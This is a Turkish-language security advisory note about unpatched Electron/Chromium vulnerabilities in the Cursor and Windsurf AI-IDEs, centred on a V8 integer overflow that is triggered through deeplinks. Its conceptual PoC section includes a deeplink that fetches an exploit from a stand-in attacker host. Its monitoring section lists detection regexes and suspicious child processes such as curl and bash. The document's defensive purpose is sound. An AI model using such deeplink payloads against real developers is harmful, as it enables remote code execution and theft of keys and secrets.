# TODO: AI-IDE Altyapi Zafiyetleri (94+ CVE) — Cursor ve Windsurf Electron/Chromium Yama Borcu

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | AI-IDE Altyapi Zafiyetleri (94+ CVE) |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | YENI: AI_IDE_Guvenligi/ |
| **Kaynak Arastirma** | [Vibecoding_Guvenlik_Aciklari_Arastirmasi.md](../Arastirmalar/Vibecoding_Guvenlik_Aciklari_Arastirmasi.md) |
| **Tarih** | 2026-03-10 |
| **Mevcut Dokuman** | Henuz yok |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** Cursor ve Windsurf gibi populer AI-IDE'ler, VS Code'un fork'lari olarak Electron ve Chromium altyapisina dayanmaktadir. OX Security arastirmasi, bu araclarin upstream VS Code guvenlik yamalarini zamaninda entegre etmedigini ortaya koymus ve 94'ten fazla bilinen zafiyet tespit etmistir. Bu durum, 1,8 milyon gelistiriciyi dogrudan risk altina sokmaktadir. Ozellikle CVE-2025-7656 (V8 Integer Overflow) zafiyeti basarili sekilde silahlandirilmis ve bir deeplink araciligiyla gelistirici makinesinde uzaktan kod yurutme (RCE) elde edilebilecegi kanitlanmistir. Fork edilen acik kaynak projelerin yama borcunun (patch debt) ne kadar tehlikeli olabilecegini gosteren kritik bir ornektir.
*   **Etkilenen bilesenler:** Cursor AI (VS Code fork, Electron/Chromium altyapisi), Windsurf IDE (VS Code fork, Electron/Chromium altyapisi), V8 JavaScript motoru, Electron framework, Chromium tarayici motoru, deeplink isleyicileri, Node.js calisma zamani

---

### 2. Teknik detay (nasil calisiyor)
*   Cursor ve Windsurf, VS Code kod tabanini fork ederek olusturulmus AI destekli IDE'lerdir. VS Code, Electron framework uzerinde calisir ve Electron da Chromium tarayici motorunu icerir. Bu katmanli mimari, her bir bilesendeki zafiyetlerin IDE'ye miras kalmasina neden olur.
*   Upstream VS Code projesi, Chromium ve Electron guncellemelerini duzenli olarak takip ederken, Cursor ve Windsurf gibi fork projeleri bu guncellemeleri geciktirmekte veya atlayabilmektedir. Bu durum "yama borcu" (patch debt) olarak adlandirilir.
*   OX Security arastirmasi, bu IDE'lerde Chromium'da aylar once yamalmis 94+ zafiyetin hala aktif oldugunu tespit etmistir.
*   En kritik ornek olan CVE-2025-7656, V8 JavaScript motorundaki bir tamsayi tasmasi (integer overflow) hatasidir. Bu zafiyet, ozel hazirlanmis bir JavaScript kodu ile V8 motorunun bellek yonetimini bozarak keyfi kod yurutmeye olanak tanir.
*   Saldiri vektoru olarak "deeplink" mekanizmasi kullanilir. Deeplink'ler, `cursor://` veya `windsurf://` gibi ozel URI semalari uzerinden IDE'yi dis kaynaklardan tetiklemeye yarar. Saldirgan, zararli bir web sayfasina veya e-postaya yerlestirdigi deeplink ile kurbanin IDE'sinde kod yurutebilir.
*   **Neden:** Kok neden, fork edilen acik kaynak projelerin guvenlik yamalarini zamaninda entegre etmemesidir. Hiz ve ozellik onceliklendirmesi, guvenlik guncellemelerinin one alinmasina neden olmaktadir. Ayrica, Electron/Chromium gibi karmasik bagimliliklarin guncellenmesi teknik olarak zor ve zaman alici oldugu icin ertelenmektedir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Cursor veya Windsurf IDE yuklenmis bir gelistirici makinesi.
*   **2. Normal durum:**
    ```
    1. Gelistirici, Cursor/Windsurf IDE'yi acar ve proje uzerinde calisir
    2. IDE, Electron/Chromium altyapisinda JavaScript kodlarini calistirir
    3. V8 motoru, tum JavaScript islemlerini guvenli bir sekilde yurutur
    4. Deeplink isleyicileri yalnizca guvenilir kaynaklardan gelen istekleri isler
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```
    1. Saldirgan, CVE-2025-7656 (V8 Integer Overflow) icin exploit kodu hazirlar
    2. Exploit, ozel hazirlanmis bir deeplink URL'sine gomulur:
       cursor://open?url=https://attacker.example/exploit.js
    3. Saldirgan bu deeplink'i bir web sayfasina, e-postaya veya GitHub Issue'ya yerlestirir
    4. Kurban linke tikladiginda, Cursor IDE otomatik olarak acilir ve exploit yuku indirilir
    5. V8 motorundaki integer overflow tetiklenir, bellek bozulmasi olusur
    6. Saldirgan, bozulan bellek uzerinden shellcode calistirarak sistemde RCE elde eder
    ```
*   **4. Analiz:** Fork edilmis IDE'lerde V8 motoru guncel olmadigindan, upstream'de aylar once yamalanan zafiyetler hala istismar edilebilir durumdadir. Deeplink mekanizmasi, saldirganin uzaktan ve kullanici etkilesimi ile (tek tiklama) IDE'yi tetiklemesini saglar. V8 integer overflow, tip guvenligi kontrollerinin atlanmasiyla bellek bozulmasina yol acar ve bu durum keyfi kod yurutmeye donusturulur.
*   **5. Kanit:** Basarili istismar sonucunda saldirgan gelistirici makinesinde isletim sistemi seviyesinde komut calistirabilir. Bu durum; kaynak kodun calinmasi, SSH anahtarlarinin sizdirmasi, .env dosyalarindaki API anahtarlarinin ele gecirilmesi ve tedarik zinciri saldirisi icin kod tabanina zararli kod enjekte edilmesi gibi sonuclara yol acar.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** CVE-2025-7656 icin 10.0'a kadar (V8 Integer Overflow — AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
*   **Saldiri Yuzeyi:** Internete acik (deeplink, zararli web sayfasi, e-posta, GitHub Issue uzerinden tetiklenebilir)
*   **Karmasiklik:** Dusuk-Orta (PoC halka acik, deeplink mekanizmasi iyi dokumanlanmis)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Cursor ve Windsurf'u en guncel surume guncelleyin. IDE icindeki Electron/Chromium surum numaralarini kontrol edip upstream VS Code ile karsilastirin. Deeplink isleyicilerini yapilandirma dosyalarindan kisitlayin veya devre disi birakin. Otomatik guncelleme mekanizmasini etkinlestirin.
*   **Orta vadeli:** IDE guncellemelerini kurumsal politikalarla zorunlu kilin. Yazilim Malzeme Listesi (SBOM) olusturarak Electron/Chromium surum takibini otomatiklestirin. Gelistirici makinelerinde endpoint koruma cozumleri (EDR) ile deeplink tabanli saldiri girisimlerini izleyin. Alternatif olarak, VS Code + eklenti yaklasimini degerlendirin (upstream guvenlik yamalarina daha hizli erisim).
*   **Uzun vadeli:** Kurumsal gelistirici arac politikasi olusturun ve yalnizca guvenlik yamalarini zamaninda takip eden araclara izin verin. AI-IDE saglayicilarina yama sureci seffafligi ve SLA (Service Level Agreement) talep edin. Gelistirici arac seciminde guvenlik kriterlerini (yama gecmisi, CVE yanit suresi) onceliklendirin. OWASP ASI Top 10 (2026) standardina uyumlulugu denetleyin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli durum (surum kontrolu):**
```bash
# Cursor/Windsurf'un eski Electron/Chromium surumunu tespit et
# Cursor:
cat /Applications/Cursor.app/Contents/Resources/app/package.json | grep -i electron
# veya DevTools Console'da:
# process.versions.electron
# process.versions.chrome

# Windsurf:
cat /Applications/Windsurf.app/Contents/Resources/app/package.json | grep -i electron

# Eger Chromium surumu upstream VS Code'dan eskiyse -> ZAFIYETLI
# Ornek: Cursor'daki Chromium 128.x vs VS Code'daki Chromium 132.x
```

**Guvenli yapilandirma:**
```bash
# 1. Otomatik guncellemeyi etkinlestir
# Cursor > Settings > Application > Auto Update: ON
# Windsurf > Settings > Application > Auto Update: ON

# 2. Chromium surum dogrulamasi
# DevTools Console (Ctrl+Shift+I):
# navigator.userAgent  // Chromium surumunu kontrol et
# process.versions.chrome  // V8 surumunu kontrol et

# 3. Deeplink isleyicilerini kisitla (macOS ornegi)
# Cursor Info.plist dosyasindan gereksiz URL schemalarini kaldir:
/usr/libexec/PlistBuddy -c "Print CFBundleURLTypes" \
  /Applications/Cursor.app/Contents/Info.plist

# 4. Linux'ta deeplink handler'i devre disi birak
# ~/.local/share/applications/ altindaki .desktop dosyalarindan
# MimeType=x-scheme-handler/cursor satirini kaldir

# 5. Kurumsal ortamda surum kontrolu (CI/CD pipeline)
#!/bin/bash
MIN_CHROME="132.0.0.0"
CURRENT_CHROME=$(cursor --version 2>/dev/null | grep -oP 'Chromium/\K[\d.]+')
if [[ "$(printf '%s\n' "$MIN_CHROME" "$CURRENT_CHROME" | sort -V | head -n1)" != "$MIN_CHROME" ]]; then
    echo "GUVENLIK UYARISI: Cursor Chromium surumu guncel degil!"
    echo "Mevcut: $CURRENT_CHROME, Gereken: $MIN_CHROME+"
    exit 1
fi
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Cursor ve Windsurf versiyonlarini tum gelistirici makinelerinde kontrol et
*   [ ] Electron/Chromium surum numaralarini belirle ve upstream VS Code ile karsilastir
*   [ ] Upstream VS Code yamalarinin uygulanip uygulanmadigini dogrula
*   [ ] Deeplink isleyicilerinin yapilandirmasini gozden gecir
*   [ ] Gelistirici arac envanteri cikar (kac kisi Cursor, kac kisi Windsurf kullaniyor)

**Duzeltme**
*   [ ] Cursor ve Windsurf'u en guncel surume guncelle
*   [ ] Deeplink isleyicilerini kisitla veya devre disi birak
*   [ ] Otomatik guncelleme mekanizmasini etkinlestir
*   [ ] Gereksiz Electron/Chromium ozelliklerini devre disi birak (WebRTC, WebGL gereksizse)
*   [ ] Kurumsal MDM veya politika araci ile surum kontrolu zorunlu kil

**Dogrulama**
*   [ ] Chromium versiyonunun upstream VS Code ile eslestigini dogrula
*   [ ] Deeplink uzerinden RCE testini yap (guvenli ortamda)
*   [ ] V8 Integer Overflow exploit testini yamali surumde tekrarla
*   [ ] EDR/SIEM'de deeplink tabanli anomali tespitini dogrula

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   Deeplink tetiklenme olaylarini izle (IDE uygulama loglari)
    *   Electron/Chromium guncelleme basarisizliklarini takip et
    *   Gelistirici makinelerinden bilinen kotu amacli domainlere baglantilari izle
    *   Regex: `(?i)deeplink.*?(cursor|windsurf|vscode):\/\/.*?(exec|run|shell|eval|open\?url=)`
    *   Regex: `(?i)(CVE-2025-7656|v8.*?integer.*?overflow|chromium.*?exploit)`
*   **Anomali Tespiti:**
    *   IDE surecinden (Cursor/Windsurf) beklenmeyen alt surec olusturulmasi (curl, wget, bash, powershell)
    *   Deeplink uzerinden bilinmeyen URL'lere yonlendirme girisimleri
    *   Electron renderer surecinden dosya sistemi erisim anomalileri
    *   IDE surecinin ag baglantisi kurmasi gereken olmayan harici sunuculara HTTP/HTTPS istegi gondermesi

---

## Notlar
OX Security arastirmasi (Subat 2026). Fork edilen acik kaynak projelerin yama borcunu (patch debt) gosteren kritik bir ornek. 1.8 milyon gelistirici risk altinda. CVE-2025-7656 (V8 Integer Overflow) basarili sekilde weaponize edilmistir. Cursor'da ayrica CVE-2026-22708 (kabuk yerlesik komut atlatmasi) ve Windsurf'ta da benzer altyapi zafiyetleri mevcuttur. OWASP ASI Top 10 (2026) ASI05 (Beklenmedik Kod Yurutme) kategorisiyle dogrudan iliskilidir.
